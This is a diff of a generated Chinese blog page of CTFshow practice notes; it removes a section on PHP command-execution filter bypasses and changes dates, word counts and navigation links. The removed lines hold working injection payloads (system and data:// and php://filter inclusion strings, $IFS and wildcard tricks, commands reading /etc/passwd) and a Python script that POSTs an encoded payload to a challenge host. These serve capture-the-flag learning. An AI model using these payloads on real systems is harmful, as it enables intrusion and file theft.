@@ -411,21 +411,21 @@ in">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-07
+                    2023-04-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    242
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    1 分
                 </div>
                 
 
@@ -474,167 +474,7 @@ backup.sql
 取消Palyload Encoding编码,因为在进行base64加密的时候在最后可能存在 == 会影响base64加密的结果
 有多重目录的url可以用number爆破出动态地址，同时记得改一下页面index.php
 </code></pre>
-<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p>
-<pre><code>【过滤变量名】
-重构变量
-?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;
-匹配符绕过
-?c=echo `cat fl&#39;&#39;ag.php`;
-?c=echo `cat fl/ag.txt`;
-?c=echo `cat fl*`;
-
-【过滤system】
-system()
-assert()
-passthru()
-exec()           //只执行无回显
-shell_exec()     // 只执行无回显
-popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );
-proc_open()      //不会直接返回执行结果，而是返回一个文件指针
-pcntl_exec()
-call_user_func()
-还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt
-
-【过滤cat】
-more:一页一页的显示档案内容
-less:与 more 类似
-head:查看头几行
-tac:从最后一行开始显示，是 cat 的反向显示
-tail:查看尾几行
-nl：显示的时候，顺便输出行号
-od:以二进制的方式读取档案内容
-vi:一种编辑器，这个也可以查看
-vim:一种编辑器，这个也可以查看
-sort:可以查看
-uniq:可以查看
-file -f:报错出具体内容
-sh /flag 2&gt;%261  //报错出文件内容
-strings:可以查看
-rev:反过来看
-新增一个xxd可以读取文件
-curl file:///flag 也行
-bash -v /etc/passwd
-date -f 好像可以越权读取文件
-
-【过滤空格】
-%09
-%20
-$IFS
-$&#123;IFS&#125;
-$IFS$9
-$IFS$1
-&lt;
-&lt;&gt;
-
-【过滤;】
-使用?&gt;替换，因为最后一句不用分号
-
-include，也就是说应该传入一个文件名
-include的文件中出错了但是主程序会继续往下执行
-
-【过滤括号】
-使用不用括号的函数(伪协议)
-?c=php://filter/read=convert.base64-encode/resource=flag.php
-伪协议也可以重构变量
-?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
-?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt
-
-【PHP伪协议】
-file:// — 访问本地文件系统
-http:// — 访问 HTTP(s) 网址
-ftp:// — 访问 FTP(s) URLs
-php:// — 访问各个输入/输出流（I/O streams）
-zlib:// — 压缩流
-data:// — 数据（RFC 2397）
-glob:// — 查找匹配的文件路径模式
-phar:// — PHP 归档
-ssh2:// — Secure Shell 2
-rar:// — RAR
-ogg:// — 音频流
-expect:// — 处理交互式的流
-
-【文件按包含漏洞】
-使用data://协议执行PHP代码
-?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码
-?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志
-此处让网页直接包含我们写入的代码，从而执行恶意命令
-但是仍然要绕过对flag的过滤
-
-【常用套娃函数】
-get_defined_vars() 返回一个包含所有已定义变量列表的多维数组
-array_pop() 是删除并返回数组最后一个元素
-current() 返回数组中的当前元素的值。别名是pos()
-next() 返回数组中的下一个元素的值。
-end()最后一个
-scandir() 函数返回指定目录中的文件和目录的数组。
-print_r() 函数用于打印变量，以更容易理解的形式展示。
-localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）
-current() 函数返回数组中的当前元素的值。别名是pos()
-array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。
-read_file()  读出源码
-highlight_file()  读出源码
-show_source()  读出源码
-
-【套娃例子】
-           要使用POST传参
-?c=eval(array_pop(next(get_defined_vars())));
-cmd=system(“cat flag.php”);
-           不使用POST传参时
-?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
-           在COOKIE处传马
-/?c=show_source(session_id(session_start()));
-再把PHPSSID值设为flag.php
-</code></pre>
-<p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p>
-<pre class="line-numbers language-Python"><code class="language-Python">import re
-import urllib
-import requests
-from urllib import parse
-#
-# hex_i = ""
-# hex_j = ""
-# pattern='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&|\-/i'
-# str1=["system","cat flag.php"]
-# for p in range(2):
-#     t1 = ""
-#     t2 = ""
-#     for k in str1[p]:
-#         for i in range(256):
-#             for j in range(256):
-#                 if re.search(pattern,chr(i)) :
-#                     break
-#                 if re.search(pattern,chr(j)) :
-#                     continue
-#                 if i < 16:
-#                     hex_i = "0" + hex(i)[2:]
-#                 else:
-#                     hex_i=hex(i)[2:]
-#                 if j < 16:
-#                     hex_j="0"+hex(j)[2:]
-#                 else:
-#                     hex_j=hex(j)[2:]
-#                 hex_i='%'+hex_i
-#                 hex_j='%'+hex_j
-#                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))
-#                 if(c ==k):
-#                     t1=t1+hex_i
-#                     t2=t2+hex_j
-#                     break
-#             else:
-#                 continue
-#             break
-#     payload = "(\""+t1+"\"|\""+t2+"\")"
-#     print(payload)
-
-payload='("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")'
-print(payload)
-data=&#123;
-    "c":urllib.parse.unquote(payload)
-&#125;
-url="http://9fdf5bf0-5dfe-4203-ae04-41501a9f6768.challenge.ctf.show/"
-re=requests.post(url,data=data)
-print(re.text)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>请查看下一篇文章。</p>
 
                 
             </div>
@@ -729,18 +569,17 @@ print(re.text)
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="">
+                <a href="../../08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/16.jpg" class="responsive-img" alt="CTFshow刷题记录">
+                        <img src="../../../../medias/featureimages/4.jpg" class="responsive-img" alt="命令执行">
                         
-                        <span class="card-title">CTFshow刷题记录</span>
+                        <span class="card-title">命令执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -750,9 +589,9 @@ print(re.text)
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-07
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-08
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -765,7 +604,6 @@ print(re.text)
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -940,7 +778,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">74.1k</span>
+                        class="white-color">74.7k</span>
             
             
             
